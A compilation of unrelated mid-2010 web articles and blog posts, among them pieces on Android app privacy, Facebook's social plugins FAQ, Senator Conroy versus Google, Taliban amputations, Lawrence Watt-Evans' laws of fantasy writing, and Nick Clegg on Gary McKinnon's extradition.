After looking into the matter more I must humbly apologize to my readers and acknowledge that the headline is misleading and the article failed to mention that users are granting permission to the apps to access data and do other activities when they download the apps .
I will be updating it shortly .
I appreciate the feedback .
The article was updated to " change misleading headline and add information throughout stating that users are granting permission to apps when they download them " .
See if you can pick up on the subtle difference in the headline :
Old headline : Report : A fifth of Android apps expose private data
New headline : Report says be aware of what your Android app does
Kudos to viligant readers for catching the mistake and insisting it be corrected , and to Ms. Mills for accepting responsibility .
I wonder if the other outlets that jumped on the story will do the same .
Sadly , there is no place for comments on the security vendor 's site .
Ever had to go to a meeting but did n't want to ?
Every single one , huh ?
I 'm with you .
Between PTA and AA it feels like I spend half my life in a folding chair with a cup of shitty coffee and a sugar cookie .
But now you can send a robot to attend for you !
Step forward the QB from Anybots - a robot who can go to the office for you .
Developed by Bob Christopher , the brainchild behind the Pleo dinosaurs , the cute looking robot is essentially a teleconferencing system on wheels .
The robot can alter its height from 3ft to 5.7ft and weighs 2.5st ( 35lbs ) , with a main computer and several mini-computers on board .
It has an LCD monitor mounted on its head which feeds a webcam image of the telecommuter .
This information is then transmitted to the remote user via a web browser , who can direct the robot with simple keyboard commands .
QB is self - balancing and rolls around on two aluminium and rubber wheels at human walking speed .
The little jerks are actually going into production and will be available this fall for $ 15,000 .
Alternatively , tape a webcam to a broomstick tied to an RC car .
BOOM -- WHO JUST SAVED YOUR COMPANY $ 14,900 ?!
It 's called InGWenuity .
Oh geez , there I go waving my magic word wand again !
Hit the jump for a closeup of deathbot 's head and a video of the squirt in action .
Ca n't make a meeting ?
Just send in your robotic co-worker [ dailymail ]
Thanks to Rob , mike469x and Zikomo , who call in to work and pretend to puke while on the phone .
Nice , guys .
Remember the billboard that the North Carolina Secular Association put up along the Billy Graham Parkway this past week ?
Yeah … well , it ’s already been vandalized :
That was fast .
What are they trying to do ?
Imitate Congress from 1954 ?
( * cue rim shot * )
As one blogger writes :
I can’t wrap my head around this .
What is so horrible about the billboard ; the unity part or the patriotism part ?
Neither is good enough for the vandal (s ) if God is n’t mentioned in the phrase .
Hopefully , Lamar Advertising will replace the billboard at no cost to the atheist group and there will be some free publicity as a result .

The internet giant Google today dismissed the Communications Minister 's withering critique of its record on privacy .
In a Senate estimates hearing last night , Senator Stephen Conroy accused the company of lying , described the views of the company 's chief executive as creepy , and said Google was responsible for the biggest privacy breach in history .
While Google has declined repeated requests for an interview , in a statement a spokeswoman said the company was surprised to hear criticism about Facebook and Google 's privacy record in a hearing supposed to be focused on the Government 's proposed internet filters .
Google has been a critic of the filters , saying they could affect user speeds , might accidentally filter legitimate material and in any event would be easy to circumvent .
This morning the internet was also biting back , with many social media users less than impressed with Senator Conroy and some suggesting he was using parliamentary privilege to attack critics of his internet filtering plan .
" Conroy 's constant misuse of parliamentary privilege to attack those who criticise him never fails to amaze and disgust me , " one user said .
" Ha , ha , ha .
The guy who wants to tell me what porn I can look at online is talking about privacy ? " another said .
" Senator Conroy claims Google says ' trust us ' with privacy .
Exactly the same argument he uses for the proposed internet filter , " another commenter said .
In recent weeks Google has been criticised after revelations that its Street View photo cars were also collecting information about people 's wireless internet connections .
Several national privacy commissioners have raised concerns over Google 's collection of wi-fi data , a practice that has ceased since it was made public .
Senator Conroy says Google considers itself to be above government .
" They consider they are the appropriate people to make the decisions about people 's privacy data and that they are perfectly entitled to drive the streets and collect as much private information by photographing over fences and collecting data information , " he said .
" This is probably the single greatest breach in the history of privacy . "
' Hypocritical '
Geordie Guy from the Electronic Frontiers Association ( EFA ) says he also thinks it is hypocritical of Senator Conroy to accuse Google of playing big brother given the nature of his proposed filters .
" It was really quite extraordinary to see him flip between things he does himself and things he accuses others of doing .
A truly extraordinary attack , " Mr Guy said .
He says Google has admitted wrongdoing and have been active in trying to fix the problem relating to collection of data .
" Google has made a mistake .
They have publicly acknowledged that in response to both private and public questions about what their activities have been and they are now undertaking to fix those issues with regulatory bodies in different parts of the world , " he said .
" EFA was part of that process originally .
We are not sitting back and seeing how Google cleans up the mess it has made and that is the type of more tactful approach we think is sufficient in this regard .
" Spending your evening lambasting public figures from within Google and Google itself as a company is not the type of tact I think it is appropriate to employ . "
Negotiating tactic
But the Internet Industry Association has been far more guarded in its comments regarding Senator Conroy .
Its communications director , John Hilvert , described the Minister 's comments as an interesting negotiating tactic but notes sometimes that is what parliamentary privilege is for .
" There are different styles and in many ways Conroy has been probably our most diligent digital economy minister , so it is not a matter of ignorance or briefing , " he said .
" It is obviously something he feels very strongly about and I guess that is what parliamentary privilege is about .
It is designed for freedom of speech of our politicians and I think that is a very worthy thing . "
He says Senator Conroy also raises a valid point about privacy for users .
" I think privacy in many ways has been one of the issues substantially overlooked over the last few years in the move to roll out social networks and the like , " he said .
" It is a shame it came up in terms of potential alleged infringements , but we are all for that and the Internet Industry Association has always pressed the role of privacy as being an absolute foundation for a healthy digital economy . "
The debate is likely to continue .
Senator Conroy says consideration of the internet filtering bill has been delayed until the second half of this year .

Three IDF soldiers belonging to the Nahal Haredi battalion shot and killed a camel in the Jordan Rift Valley Friday following a dispute with a local Bedouin .
The Bedouin said the soldiers were trespassing through his property .
A formal complaint was handed over to the IDF through the Civil Administration .
The three soldiers involved in the incident left their base without permission around 6 pm Friday in order to tour the area .
They passed by a local Bedouin resident and entered his tent .
Following an argument that lasted several minutes , the soldiers left the tent , but one of them kneeled down and fired at the camel .
The Bedouin immediately phoned Civil Administration officials and reported the incident .
The Administration 's representatives , accompanied by Nature Reserve Authority members , rushed to the area and attempted to save the camel 's life .
However , it was gravely hurt and died at the site .
Army to deal with ' grave incident '
A report on the incident was relayed to the Nahal Brigade , to the Kfir Division , and to the Military Police .
The Civil Administration 's chief , Brigadier General Yoav Mordechai , spoke with senior Palestinian officials in the Jericho area and pledged to look into and deal with the incident .
The Bedouin camel - owner will be summoned to the Coordination and Liaison office in Jericho Sunday in order to provide his account of the incident .
He is also expected to file a lawsuit against the soldiers in order to receive compensation .
Military officials said the incident was grave and will be dealt with through disciplinary action .

Those living in small spaces have to be creative about dividing up the space , but putting up screens only gets you so far .
This ingenious bedroom design is an entire loft bedroom that securely hangs from the ceiling , providing a sleeping space that makes use of high ceilings .
Positioned as it is within this particular room , the loft still leaves enough room for adults to stand up beneath it , but is low enough to easily walk into from the elevated portion of the space .
The back surface of the loft could even be used as a movie screen .
There must be something about being a great artist that requires you to hide material to keep people satisfied for years after your death .
Which is remarkable , considering how much money they could get for this hidden material while they are alive .
Well , the biggest rock band of all time somehow still has material out in the world that the public has yet to hear , but the best director in the world is bringing some of it to the light of day .
Martin Scorsese , who needs no introduction , has been working for some time on a documentary on the life of George Harrison , who also needs no introduction .
While at Cannes , Scorsese revealed some details about the project that should have Beatles ‘ fans frothing at the mouth .
Harrison ’s widow Olivia found old cassette recordings that the late musician made while in the Beatles , but whether they are demos of Beetles songs , originals or covers remains to be seen , err , heard .
Harrison it seems was a bit of a pack - rat and saved everything , so there was a wealth of material from which to draw for the film .
Basically , the film just earned your ticket money regardless of the quality .

by Lawrence Watt - Evans
I make my living writing , and most of what I write is fantasy .
I 'm fortunate in that fantasy happens to be popular at the moment , which is why I can make a living at it .
I like fantasy .
Fantasy can be a confusing genre , though ; some people are n't clear on what it is , where it overlaps ( or does n't ) with science fiction , and so forth .
Here are my own definitions :
Fiction is anything that has n't necessarily happened .
Contemporary fiction is any story that could take place more or less at the time the writer wrote it , give or take a few insignificant years , without any drastic variation from everyday reality .
This includes most " mainstream " fiction , as well as most mysteries , romances , and so forth .
Historical fiction is any story that could have taken place at some time in the recorded past , wherein the author has done his or her best to reconstruct some particular time , whether it 's ancient Rome or the American West of 1870 or Paris during the 1968 riots .
Science fiction is any story that might someday be possible , not fitting the two definitions immediately preceding this one ; it can be contemporary in setting , or historical , or prehistoric , or futuristic , or even set in parallel worlds .
Certain outright impossibilities are sometimes allowed , such as time travel , faster - than - light travel , and so forth , though they strictly should n't be , in my opinion ; I suppose that they 're permitted because they were used in science fiction before they were clearly established to be impossible , and tradition has kept them on .
Any fiction not meeting the three preceding definitions is fantasy .
What does that leave , though ?
I 've eliminated everything that might be possible .
That means that fantasy is stories about the impossible ; not just things that are impossible now , but things that will always be impossible .
An alien spaceship landing in your front yard tonight is drastically unlikely , so that 's not contemporary fiction , but it 's not demonstrably impossible , so it 's science fiction , not fantasy ; when there 's doubt , it 's SF .
A wizard appearing in your kitchen and turning you into a frog is impossible , so that 's fantasy .
( Of course , an alien disguised as a wizard using incredibly advanced technology to turn you into a frog is science fantasy , a sort of hybrid genre made possible largely by Clarke 's Third Law , which says any sufficiently advanced technology is indistinguishable from magic . )
In fantasy , anything is possible .
That 's what makes it fantasy .
There 's a problem with that .
It makes it too easy .
If absolutely anything is possible , then the hero can simply wave his hand in the air at the appropriate moment and turn all his enemies into rocks .
That would be fantasy , all right , but it would n't be good fantasy .
A good fantasy story , while including at least one or two outright impossibilities , sets down rules for itself and abides by them .
It has logic to it , though not necessarily exactly the logic we use in our own everyday lives .
If a story does n't have internal logic and consistency , it is n't any fun to read .
Where everything is possible , everything is boring , because the reader knows that the hero can always just turn the bad guys into fungus .
There 's no chance to build up any sort of interest or suspense when anything can happen .
Therefore , fantasy has its own rules , and in order to write the stuff I had to figure out what some of those rules are .
I 'm still working on the details of this , you understand , but after a few years in the field I think I 've hit on most of the basic points , and here they are :
Watt - Evans ' First Law of Fantasy : Stories are about people .
A good story is a good story , and the genre does n't change that ; a pointless , rambling bunch of events is not a story .
A story is not just events , it 's events that affect someone .
Stories are about people .
Being people ourselves , we 're just fascinated with people .
Oh , in science fiction and fantasy the people do n't have to be human , necessarily , but they still have to be people .
They do n't even need to actually appear in the story , but the story needs to be about people somehow .
In Ray Bradbury 's classic SF short story " There Will Come Soft Rains " , for example , no human beings ever appear ; the dialogue , if you can call it that , is entirely spoken by machines going through their programmed day after a nuclear war has wiped out their owners .
However , the story is about those dead owners , because the machines , through their programming , reflect the people who built and ran them .
The reader sees the mechanical remnants of their daily routines , learns what they ate for breakfast , how they kept the house clean , even their favorite poems .
In bad fantasy , however , people are n't always to be found .
Stereotypes are likely to turn up instead , often in the guise of " archetypes " .
Fighting - mad barbarians , nubile and willing slave - girls , plucky princesses , evil wizards , clever thieves , and all the rest abound , in various textures of cardboard , but no real people .
The discerning reader wo n't accept this ; he or she demands characters she or he can believe in .
Of course , there are enough less - than - discerning readers around to keep a good many cardboard characters in print .
Watt - Evans ' Second Law of Fantasy : People are never wholly good or wholly evil , and therefore characters should never be wholly good or wholly evil .
Characters , like real people , should be concerned with other things besides Good and Evil .
They must n't all be just good guys or bad guys ; in fact , no one is perfect , eliminating your stereotypical good guy , and nobody thinks of himself as evil , eliminating your stereotypical bad guy .
No one thinks of himself as a villain .
That does n't mean you can't have villains , though .
Adolf Hitler did n't think of himself as an evil man ; he was trying to make the world safe for the master race , as he saw it , and that was , from his point of view , a very good thing , so that it did n't matter if a lot of people got killed in making it happen .
He did n't think of himself as evil , yet I do n't think anyone would deny he was a very satisfactory villain .
In bad fantasy stories , though , the villains are often evil for the sake of evil , proudly , arrogantly evil , proclaiming from the rooftops that they are the very epitome of evil , doing evil , rotten things just because they 're evil .
I do n't buy it .
I 'm sorry , but that just does n't work for me , and I do n't think it would work for anybody else , either .
I can't see a real person , even a wizard or demigod , saying to his henchthings , " Hey , what can we do today that 's really rotten ? "
Doing nasty , rotten things for power ( " What can we do today to make people do what we want ? " ) , or vengeance ( " What can we do today to make life miserable for all those people who mistreated me ? ) , or spite ( " What can we do today to make everyone as miserable as I am ? " ) , or even for sexual jollies ( " What can we do today that 's kinky ? " ) , I can accept , but not just for the sake of evil .
And being good for the sake of goodness does n't work very well , either .
Fighting the villains because they 're evil does n't work .
For one thing , how do you know they 're evil ?
Fighting the villains because they 've harmed people , or threatened to harm people , or might harm people , or just for the sake of fame and glory , I can accept .
Even simply out of the personal satisfaction in doing something well , I can accept .
But not just because we 're good and they 're evil .
This excludes religious or patriotic crusades , of course , which are often based on " We 're good , they 're evil , " but where in fact neither side has a monopoly on either .
In crusades , the characters can think they 're acting purely because they 're good and the other guys are evil , but only in a very weak story would they be right .
Watt - Evans ' Third Law of Fantasy : The basic human motivations are universal .
People should still act like people , whether they 're ancient wizards bent on world domination , or six inches tall and living in somebody 's woodwork .
They can fight for love , sex , money , power , fear , security , pride , and all the other important things , but not just for good or evil .
And this includes all the people .
In far too many fantasy stories only the main characters are people .
Palace guards , in particular , come off badly ; nobody seems to think twice about slitting the throats of a few guardsmen .
I do n't care what the job pays , you 'd never get me to be a palace guard in some of these universes .
If I wanted to commit suicide I could find more entertaining ways .
Besides , they 're so utterly ineffectual .
Really , has any clever thief or sneaky barbarian ever been stopped by palace guards ?
Why do all these palace - owners bother with them ?
If I were hiring guards , I would want them to have at least some instinct for self - preservation , and to know how to do something other than stand there looking bored until someone sneaks up from behind and cuts their throats , or jumps down from an overhanging ledge , or gets them to look the wrong way with the distinctive sound of a pebble being thrown .
Soldiers have it almost as bad .
They have this tendency to fight to the last man .
In real life , most battles end as soon as one side is clearly winning , because the other side will turn and run -- or at best manage an orderly retreat .
Dying , even in a glorious cause , is not popular with ordinary soldiers .
Even palace guards can have wives and children and worry about putting food on the table , and the fewer who throw themselves into the hero 's field of fire the better , as far as I 'm concerned .
Watt - Evans ' Fourth Law of Fantasy : Everything other than the basic human motivations will vary , depending on the cultural setting .
None of what I 've said so far means that all the people in fantasy stories should act like your next door neighbor .
The basic human emotions should stay the same , but not how they 're shaped .
After all , these characters grew up in a fantasy world , different from your own .
Whatever a person grew up with , that 's what will seem natural to him or her .
If someone grew up conjuring demons every Thursday morning , then he will not be amazed or thrown off - stride by seeing demons conjured ; it will seem perfectly normal to him .
At least , on Thursdays .
People vary drastically according to their native culture ; anyone who has travelled extensively knows that .
The people in fantasy novels , therefore , should not think and act like ordinary twentieth - century Americans somehow thrust into another world ( unless , of course , they are twentieth - century Americans thrust into another world ) .
A boy who grew up as a pseudo - medieval peasant , spending all his life on a half - acre of ground , is not going to think the same way that a modern American suburbanite thinks ; he 's likely to be constantly aware of the weather and the seasons , alert to birds and wildlife ( they can damage desperately - needed crops ) , but with no clear idea what a mountain or an ocean might be , for example , no idea what might lie beyond the horizon , even as to whether the laws of nature are the same elsewhere as at home .
And , since this is fantasy , they might not be .
If he was brought up in a religion with a hundred gods , he 's very unlikely to embrace monotheism -- or atheism .
And if his world is full of magic , then he will accept magic as an everyday part of his life .
Watt - Evans ' Fifth Law of Fantasy : Magic , like everything else , has rules .
A writer needs to let the reader know just what the situation is .
Is magic everywhere , fairies under every bush , dryads in every tree and nixies in every brook ?
Can anybody work spells just by putting rhymes together ?
Or is magic rare and valuable ?
Can only a handful of wizards cast spells ?
The rules need to be consistent .
If it 's established that only kings can work healing spells , for example , and the peasant hero heals his dying friend 's wound , you darn well better explain that he 's actually a long - lost heir to a throne somewhere , or the reader will feel cheated .
You had also better work out just how this magic fits into the world you 've invented .
If the gods appear regularly at their worship services , for example , your hero really can't be an atheist unless he 's an idiot or blind .
If alchemists can turn entire mountains to gold with no effort , the money can't be on a gold standard -- at least , not unless the alchemists control the economy and maintain the currency artificially .
If wizards can turn people into frogs , warfare is not going to be a matter of swords and armor , but of wizards hurling spells -- unless there 's some very good reason the wizards do n't get involved .
Watt - Evans ' Sixth Law of Fantasy :
If a story can be written without a fantasy element , then do n't bother with the fantasy element .
Avoid the Bat Durston syndrome .
The now - defunct SF magazine Galaxy , back in the fifties , used to run an ad saying " You wo n't see it here ! " and giving a paragraph each of a Western and a space opera , with only the names of the hardware changed - - horses ' hooves to rockets , six - guns to blasters , and so on .
The same thing is possible with fantasy , and is very much to be avoided .
Some fantasy stories are simply war stories , with wizards throwing fireballs in place of cannons , or love stories , with one corner of a triangle an elf - maiden or a werewolf instead of the redhead from the Accounting Department , or adventure stories , where the blizzard is sent by a sorcerer rather than a freak low pressure system .
Most common of all is the war or adventure story that uses a fantasy setting because the writer can't be bothered to properly research an appropriate historical milieu .
If you 're going to the trouble of writing a fantasy story , then the entire plot should evolve from the fantasy elements .
Explore the ramifications of a complex spell , or figure out what it would be like to be under a particular curse , or consider what might happen if gods really walked the earth , or devise a way that a flat world could really exist and still have air , gravity , and oceans .
Or , of course , there 's the sort of fantasy that adds an impossible element to our everyday world ; I do n't mean to slight that , though it seems relatively scarce nowadays .
I mean the sort of thing where the redhead from Accounting turns out to be a werewolf .
Even here , though , the story has to evolve from the fantastic elements if it 's going to be any good .
Simply telling an ordinary love story where one person 's a werewolf is pointless unless her lycanthropy affects the relationship somehow .
In short , to write fantasy , you invent your fantasy world -- which can be almost like our own , or totally alien -- put real people in it of the sort who would really live in such a place , present them with a problem that develops from one of the elements impossible in our world , keep it all consistent , and you have a fantasy .
Then all you have to do is tell a story .
Other Laws :
Watt - Evans ' Law of Literary Creation :
There is no idea so stupid or hackneyed that a sufficiently - talented writer can't get a good story out of it .
Feist 's Corollary :
There is no idea so brilliant or original that a sufficiently - untalented writer can't screw it up .
( Raymond Feist came up with this one in response to my " Law of Literary Creation . " )
Morrison 's Corollary :
There is no idea that a sufficiently - talented writer has made into a good story that can't become annoying in the sequels .
( Keith Morrison added this one in 1999 . )
Holliday 's Corollary :
There is no plot so stunningly original that a journalist can't make it sound hackneyed .
( Added May 12 , 2000 , courtesy of Liz Holliday . )
Debra Doyle 's Rule :
If it has horses and swords in it , it 's a fantasy , unless it also has a rocketship in it , in which case it becomes science fiction .
The only thing that 'll turn a story with a rocketship in it back into fantasy is the Holy Grail .
( Reprinted by permission of Debra Doyle )
Sophronia 's Rule :
Do n't use metaphors in fantasy ; your readers will take them literally .
Or they may take them figuratively -- but if so , they 'll also take your magics and transformations figuratively .
Either way , you 're in trouble .
( Reprinted by permission of Teresa Nielsen Hayden )
Steven Brust 's Rule :
Do n't explain why it works ; explain how you use it .
Yog 's Rule : Money flows toward the writer .
Busick 's Law :
The viewer or reader should need to fanwank as little as possible .

Recently the Taliban chopped off the hands of three young tribesmen in Orakzai – Amal Khan , Razim Khan and Khaisteen – for alleged theft .
The men , who come from poor families , are under treatment in a Kohat hospital .
I had a chance to talk with the brothers of two of them , who are looking after them in the hospital .
They said that the men were brought to a bazaar where their hands were chopped off in public and that they were more or less left to bleed to death with no medical help .
The tribesman who had accused the three men of theft had forgiven them but he , I was told , was afraid to convey this to the Taliban , out of fear that they might chop off his hands as well .
There is no authority in Orakzai where the family members of the three men could have sought help .
The agency is under de facto control of the Taliban ( including a chunk of the Taliban from Punjab ) along with al Qaeda foreigners .
I was told that despite the ongoing military operations many of the Taliban ’s private jails in the agency and training centres are still functioning .
This is not the first time that the Taliban have chopped off hands .
On dozens of occasions in the past , they have amputated men , flogged people and hung up dead bodies on trees .
And now this past week , they literally blew up two alleged spies by attaching explosives to them and triggering them — in a public place .
Of course , this has the effect of causing extreme fear and dread in the local population which obviously has no choice but to see all this happen in silence .
Despite media coverage of this incident no one from the government has visited the three men who want to know under what law they were amputated .
They said nobody can get them back their hands , but want to know who will compensate them for their loss in material terms , given that they have been crippled for life and will no longer be able to pursue a livelihood .
The root cause of the sufferings in Fata is the fact that the state of Pakistan does n’t see matters beyond carrying out military operations in the region .
There seems to be no concept of doing something for the people of Fata , most of whom consider themselves as second - class citizens of Pakistan .
As for the three men , they and their families are now living as IDPs in Kohat .
They are seeking help from philanthropists in Pakistan or beyond to help them finance the purchase of artificial hands so that the men can at least work to support their families .
I would request the people of Pakistan to generously extend help to them as a symbolic defiance to the Taliban , al Qaeda and the state ’s flawed policies in the region vis -a - vis these militants .

Are you freaked out ?
jolieodell Last week , Facebook announced social plugins -- tools that export data about Facebook users to participating websites across the Internet .
To see the plugins in action , log in to Facebook and then go to Yelp .
You should see a Facebook notification drop - down from the top of your browser , telling you : " Yelp is using Facebook to personalize your experience . "
Navigating around Yelp , you 'll see some of your friends faces here and there , along with their content recommendations .
It 's an opt - out experience , and this freaks out some users .
Facebook wrote a big post explaining the news on its official blog .
The main gist Facebook wants to get across is that " The plugins were designed so that the website you are visiting receives none of this information . "
" These plugins should be seen as an extension of Facebook . "
Here 's the whole post :
Answers to Your Questions on Personalized Web Tools
by Austin Haugen on Monday , April 26 , 2010 at 2:17pm
We 've had an amazing response to our announcements from last week as more and more people engage with social and personalized experiences on other websites and services .
We 've also heard many questions and wanted to answer the most common ones here to explain in more detail how a new set of tools — called social plugins — work .
Using social plugins , websites everywhere can give you more ways to experience the web with your friends — from letting you form connections on these sites with your favorite movies or restaurants to showing you the most popular content based on what is being shared among your friends .
Rather than seeing popular stories , products or reviews from people you do n't know , you 'll now see content that matters to you the most — from your friends — prominently displayed .
These new plugins , introduced on more than 75 sites and services last week , offer you the same control over what you can see and what you can share as you already have on Facebook .
Our highest priority is to keep and build the trust of the more than 400 million people who use our service every month .
To do so , we 've developed powerful tools to give people control over what information they want to share , when they want to share it and with whom .
For more information on some of the websites currently using social plugins , visit the Facebook Platform showcase .
Answers to more questions are also available in our site tour and Help Center .
What are social plugins ?
Social plugins are simple tools that can be " dropped " into any website to provide people with personalized and social experiences .
As we announced previously , you will start noticing these new tools on other websites in a few different formats :
" Like " or " Recommend " buttons : Click to publicly share and connect with content you find interesting .
Click to publicly share and connect with content you find interesting .
Activity Feed :
What your friends are liking , commenting on or sharing on a site .
What your friends are liking , commenting on or sharing on a site .
Recommendations :
Most liked content among your friends on a site .
How do the plugins work ?
While these buttons and boxes appear on other websites , the content populating them comes directly from Facebook .
The plugins were designed so that the website you are visiting receives none of this information .
These plugins should be seen as an extension of Facebook .
You only see a personalized experience with your friends if you are logged into your Facebook account .
If you are not already logged in , you will be prompted to log in to Facebook before you can use a plugin on another site .
At a technical level , social plugins work when external websites put an iframe from Facebook.com on their site — as if they were agreeing to give Facebook some real estate on their website .
If you are logged into Facebook , the Facebook iframe can recognize you and show personalized content within the plugin as if the visitor were on Facebook.com directly .
Even though the iframe is not on Facebook , it is designed with all the privacy protections as if it were .
What information about me does Facebook share with the websites hosting social plugins ?
None of your information — your name or profile information , what you like , who your friends are , what they have liked , what they recommend — is shared with the sites you visit with a plugin .
Because they have given Facebook this " real estate " on their sites , they do not receive or interact with the information that is contained or transmitted there .
Similarly , no personal information about your actions is provided to advertisers on Facebook.com or on the other site .
How do I recognize a Facebook social plugin on another site ?
You 'll recognize them by the branding in the footer that resembles similar features on Facebook — the " f " icon is next to the phrase , " Facebook social plugin . "
The phrase is a hyperlink to a landing page describing the product .
What am I sharing when I click a Like or Recommend button on external websites ?
The Like and Recommend buttons on other sites work in a similar way to the " Share " buttons from Facebook and other services that you 've likely seen on the web for years .
These buttons enable you to publicly express your interest in some piece of content with a simple action , similar to how you might rate a restaurant or movie on a site today .
Nothing happens unless you choose to click the buttons , and you must be logged into Facebook before you can use them .
When you click " Like " or " Recommend , " the button turns darker to indicate that you like or recommend something and are making a public connection to it .
Back on Facebook , a story will post to your profile and may appear in your friends '
News
Feeds in the same way as if you had liked something on Facebook .
You can click " Like " again if you wish to remove the like .
Your likes and recommendations also may appear to your friends on the website where you clicked the button and elsewhere through other Facebook social plugins appearing on websites — such as Activity Feed or Recommendations .
Some sites may also give you the option to add a comment when you like or recommend something .
In some cases , when you create a connection to a real - world entity , such as a book , movie or athlete , your likes and recommendations become a part of your profile in the same way as the connections you make with Pages on Facebook .
They will appear in your " Likes and Interests " section of your profile , and you may receive updates from that connection in News Feed .
For more examples of how the Like buttons and other social plugins work on different sites , read our previous blog post .
Will people beyond my friends see what I like or recommend ?
Yes , you should consider the likes and recommendations you choose to make to be public information , much like when you comment or write a review on any website today or connect with a public Facebook Page .
Based on feedback we 've received , though , we are updating the social plugins we announced last week —
Like , Activity Feed and Recommendations — to only display your friends ' names and profile pictures and to show the likes and recommendations from people who are n't your friends in an aggregated format ( " 10 people like this " ) .
When a like makes a connection in your profile , you can control who can see that in your Facebook profile by editing your " Friends , Tags and Connections " settings on your Privacy Settings page .
Remember that even if you limit the visibility of a connection , it remains as public information and may appear in other places on Facebook.com or be accessed by applications and websites .
Depending on the connection you made , you can remove a connection completely either by going to the " Info " tab of your profile and editing your " Likes and Interests , " or by returning to the web page where you liked something and unliking it .
Why do some of the things I like from other websites appear in my " Likes and Interests " section of my profile , while others do n't ?
Social plugins are a common set of tools from Facebook to bring social and personalized experiences to other websites you visit .
However , each website may choose to implement them in different ways .
In some cases , your likes and recommendations become a part of your profile in the " Info " tab in the same way as the connections you make with Pages on Facebook .
This occurs when you like or recommend a real - world entity , such as a book , movie or athlete , where it makes more sense to form a lasting relationship .
Why do I see some of my friends ' names and thumbnails of their profile pictures on other sites ?
Social plugins personalize your experience on others sites based on your Facebook friends .
When one of your friends has chosen to like or recommend something on a site and you are logged into Facebook , you may see that fact appear along with a small thumbnail of your friend 's profile picture .
This is personalized just for you .
Every Facebook user who comes to a site will have a different , personalized experience based on who they are friends with on Facebook .
This is similar to how your home page on Facebook.com works , where you see a News Feed unique to your network of friends .
Are there any new privacy controls for social plugins ?
These new features follow the same privacy settings as those we already had in place on Facebook .
For example , you can control how information is shared on Facebook.com on your Privacy Settings page under " Posts by Me , " and you can change which connections are visible on your profile under " Things I Like . "
For both , you can set controls to " Everyone , " " Friends and Networks , " " Friends of Friends , " " Only Friends , " or " Customize " to use Friend Lists or to include or exclude specific people .
Remember that , even if you change your settings for what is shared or shown on Facebook , likes and recommendations made on other sites become publicly available information , similar to a public comment on a website .
Only click the Like or Recommend buttons if you want to share your likes and recommendations publicly .
How is this different from the " Log in with Facebook " or " Connect " features I see across the Web ?
If you want to interact more deeply with a website , on some sites you 'll see ways to login or sign in to that site using your Facebook information .
This capability has been available since July 2008 and was previously called Facebook Connect .
It provides you with ways to share your information with other websites and find your friends .
In these cases , you are establishing a relationship directly with these websites and sharing your information with them after you choose to sign in ; this includes your data from social plugins .
Why does a blue bar appear on some sites telling me it 's being personalized by Facebook ?
Separate from our social plugins , we have established a small pilot program with an exclusive set of partners —
Microsoft Docs.com , Pandora and Yelp — to offer personalized experiences as soon as you visit those services .
These partners have been given access to public information on Facebook — such as names , friend lists and interests and likes — to personalize your experience when you 're logged into Facebook and visit their sites .
When you first visit any of these three partner sites while logged into Facebook , you 'll see a blue bar appear at the top of the site letting you know that your experience is being personalized .
You can learn more about it , remove the personalized experience or click " x " to remove the bar .
If you do n't want your experience personalized on this limited number of sites , you can opt out by going to " Application and Websites " on your Privacy Settings page and editing the " Instant Personalization " setting .
These partners were carefully chosen , reviewed and are contractually required to respect people 's privacy preferences .
Additionally , they are required to provide an easy and prominent method for opting out directly from their website and to delete data if people choose to opt out .
We hope you 'll give these new social and personalized experiences a try to see what 's possible when you 're friends are with you on the web .

Angle is only doing what Sarah Palin did - ducking the media , channeling her message entirely to the base , avoiding what she called the " filter " whereby her statements and record could actually be challenged by reporters .
Angle has not quite gotten away with it because the Nevada press is much , much more professional than the national press corps .
But she 's trying .
And she heralds a possible era in which candidates do not even pretend to be accountable , but exist in a bubble of machine politics , with its own media apparatus , designed for p.r. not scrutiny .
And then there are the clones , as above .
If the pretty , big - boobed , gun-toting hottie paradigm was enough to get an unbalanced know - nothing thisclose to the presidency , then you can rest assured others took notice .

The Triangulum Galaxy is a spiral galaxy approximately 3 million light years distant in the constellation Triangulum .
It is catalogued as Messier 33 , and is sometimes informally referred to as the Pinwheel Galaxy , a moniker it shares with Messier 101 .
The Triangulum Galaxy is a member of the Local Group of galaxies , which includes the Milky Way Galaxy , the Andromeda Galaxy and about 30 other smaller galaxies .
Nick Clegg admits : I might not have the power to stop Gary McKinnon 's extradition
New stance : Nick Clegg has admitted the government may be powerless to prevent Gary McKinnon 's extradition
Stopping the extradition of Gary McKinnon to the U.S. may not be within the Government 's power , Nick Clegg suggested yesterday .
The comment - his first intervention in the case since becoming Deputy Prime Minister - surprised supporters of the 44 - year - old computer hacker because it was completely at odds with Mr Clegg 's previously stated position .
In opposition Mr Clegg , backed by independent legal advice , had argued fiercely that ministers could use human rights grounds to halt Gary 's extradition to the States , where he faces up to 60 years behind bars .
Last night campaigners said that , with trust in politicians at an all - time low , it was vital for Mr Clegg to keep his word .
The Lib Dem leader made his new remarks in the wake of the decision by Home Secretary Theresa May to halt Gary 's extradition while she considers fresh medical evidence that he will kill himself if sent to the U.S .
Mr Clegg was previously one of the staunchest supporters of the Asperger 's sufferer , who hacked into Nasa and Pentagon computers looking for evidence of ' little green men ' .
Last year , when the prospect of his party finding itself with a share of government was highly unlikely , Mr Clegg said it was ' completely within the power ' of then Home Secretary Alan Johnson to step in .
But yesterday , speaking about Gary 's case for the first time since the election , he appeared to change his tone .
Initially , Mr Clegg said : ' I have n't changed my view one bit :
That I believe it would be best for Gary McKinnon to be tried here . '
Reminded on live radio that now , as Deputy Prime Minister , he has real power to do something , Mr Clegg then responded : ' What I have n't got power to do , neither has the Home Secretary neither has even the Prime Minister , is to completely reverse and undo certain legal aspects of this .
' That of course you would n't want politicians to do .
That 's what we are looking at at the moment .
It 's legally very complex .
But on the sort of morality and principle of it , I have n't changed my view one bit .
' It would be the right thing to do to have Gary McKinnon tried in this country . '
Keith Vaz , chairman of the home affairs select committee in the last Parliament , said : ' I am surprised at these comments .
' The committee unanimously said that the Home Secretary does have the legal power to prevent the extradition of Gary McKinnon .
I welcome Theresa May 's decision to review the case before making any decisions . '
Gary 's Tory MP David Burrowes , a former shadow justice minister , said : ' There is the power and I disagree with anyone from the Prime Minister down who says the Home Secretary cannot intervene .
' If there has been a breach of human rights you can intervene . '
Mr Burrowes , who praised Mrs May for her intervention , added : ' The big issue in the election was one of trust .
It is now about Parliamentarians keeping their promises and doing what they say . '
